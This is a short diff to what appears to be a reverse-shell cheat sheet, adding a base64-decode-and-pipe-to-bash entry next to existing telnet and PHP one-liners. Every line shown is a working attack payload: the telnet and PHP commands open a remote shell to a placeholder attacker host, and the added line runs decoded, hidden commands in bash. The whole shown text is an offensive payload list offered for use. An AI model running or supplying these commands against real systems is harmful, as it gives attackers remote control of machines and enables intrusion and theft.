@@ -35,3 +35,6 @@ telnet <attacker_IP> 4444 | /bin/bash | telnet <attacker_IP> 4445
 
 #PHP
 php -r '$sock=fsockopen("<attacker_IP>",<attacker_PORT>); exec("/bin/sh -I <&3 >&3 2>&3");'
+
+#Base64 echo
+echo "BASE64 ENCODED" | base64 -d | bash
